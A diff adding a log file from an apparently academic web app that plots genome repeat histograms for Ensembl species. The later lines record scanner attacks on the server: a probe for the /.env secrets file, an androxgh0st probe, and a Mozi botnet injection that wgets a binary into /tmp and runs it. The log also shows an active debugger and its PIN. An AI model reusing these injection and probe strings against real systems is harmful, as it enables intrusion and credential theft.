@@ -1,0 +1,46 @@
+INFO:root:Scraping data links from ensemble rest API and generating ensemble genome Objects
+INFO:root:Scraping data links from repeatMask.org of program output
+INFO:root:Gettint intersection of species with data in ensembl and repeatMask.org
+ERROR:root:Failed to generate histograms for Vicugna pacos | Alpaca
+ERROR:root:Failed to generate histograms for Dasypus novemcinctus | Armadillo
+ERROR:root:Failed to generate histograms for Crocodylus porosus | Australian saltwater crocodile
+ERROR:root:Failed to generate histograms for Otolemur garnettii | Bushbaby
+ERROR:root:Failed to generate histograms for Latimeria chalumnae | Coelacanth
+ERROR:root:Failed to generate histograms for Tursiops truncatus | Dolphin
+ERROR:root:Failed to generate histograms for Loxodonta africana | Elephant
+ERROR:root:Failed to generate histograms for Gorilla gorilla gorilla | Gorilla
+ERROR:root:Failed to generate histograms for Cavia porcellus | Guinea Pig
+ERROR:root:Failed to generate histograms for Erinaceus europaeus | Hedgehog
+ERROR:root:Failed to generate histograms for Procavia capensis | Hyrax
+ERROR:root:Failed to generate histograms for Petromyzon marinus | Lamprey
+ERROR:root:Failed to generate histograms for Echinops telfairi | Lesser hedgehog tenrec
+ERROR:root:Failed to generate histograms for Pteropus vampyrus | Megabat
+ERROR:root:Failed to generate histograms for Myotis lucifugus | Microbat
+ERROR:root:Failed to generate histograms for Ochotona princeps | Pika
+ERROR:root:Failed to generate histograms for Sorex araneus | Shrew
+ERROR:root:Failed to generate histograms for Choloepus hoffmanni | Sloth
+ERROR:root:Failed to generate histograms for Tupaia belangeri | Tree Shrew
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 131-831-235
+INFO:werkzeug:132.70.66.9 - - [25/Apr/2022 08:14:08] "GET /Human HTTP/1.1" 200 -
+INFO:werkzeug:132.70.66.9 - - [25/Apr/2022 08:14:09] "[36mGET /static/plotly.js HTTP/1.1[0m" 304 -
+INFO:werkzeug:132.70.66.9 - - [25/Apr/2022 08:14:57] "GET /Human HTTP/1.1" 200 -
+INFO:werkzeug:132.70.66.9 - - [25/Apr/2022 08:14:57] "[36mGET /static/plotly.js HTTP/1.1[0m" 304 -
+INFO:werkzeug:167.94.138.44 - - [25/Apr/2022 08:14:58] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:167.94.138.44 - - [25/Apr/2022 08:14:58] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:167.94.138.44 - - [25/Apr/2022 08:14:58] code 505, message Invalid HTTP version (2.0)
+INFO:werkzeug:167.94.138.44 - - [25/Apr/2022 08:14:58] "[35m[1mPRI * HTTP/2.0[0m" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+INFO:werkzeug:132.70.66.9 - - [25/Apr/2022 08:16:13] "GET /Platypus HTTP/1.1" 200 -
+INFO:werkzeug:132.70.66.9 - - [25/Apr/2022 08:16:13] "[36mGET /static/plotly.js HTTP/1.1[0m" 304 -
+INFO:werkzeug:132.70.66.9 - - [25/Apr/2022 08:16:41] "GET /Mallard HTTP/1.1" 200 -
+INFO:werkzeug:132.70.66.9 - - [25/Apr/2022 08:16:41] "[36mGET /static/plotly.js HTTP/1.1[0m" 304 -
+INFO:werkzeug:132.70.66.9 - - [25/Apr/2022 08:17:02] "GET /Cow HTTP/1.1" 200 -
+INFO:werkzeug:132.70.66.9 - - [25/Apr/2022 08:17:02] "[36mGET /static/plotly.js HTTP/1.1[0m" 304 -
+INFO:werkzeug:132.70.66.9 - - [25/Apr/2022 08:17:39] "GET /Rat HTTP/1.1" 200 -
+INFO:werkzeug:132.70.66.9 - - [25/Apr/2022 08:17:39] "[36mGET /static/plotly.js HTTP/1.1[0m" 304 -
+INFO:werkzeug:51.79.29.48 - - [25/Apr/2022 08:31:43] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+ERROR:werkzeug:51.79.29.48 - - [25/Apr/2022 08:31:43] code 400, message Bad request syntax ('0x%5B%5D=androxgh0st')
+INFO:werkzeug:51.79.29.48 - - [25/Apr/2022 08:31:43] "[35m[1mNone / HTTP/0.9[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:51.79.29.48 - - [25/Apr/2022 08:31:44] "[35m[1mGET /.env HTTP/1.1[0m" 500 -
+ERROR:werkzeug:117.201.207.240 - - [25/Apr/2022 08:34:40] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
+INFO:werkzeug:117.201.207.240 - - [25/Apr/2022 08:34:40] "[35m[1m27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0[0m" HTTPStatus.BAD_REQUEST -
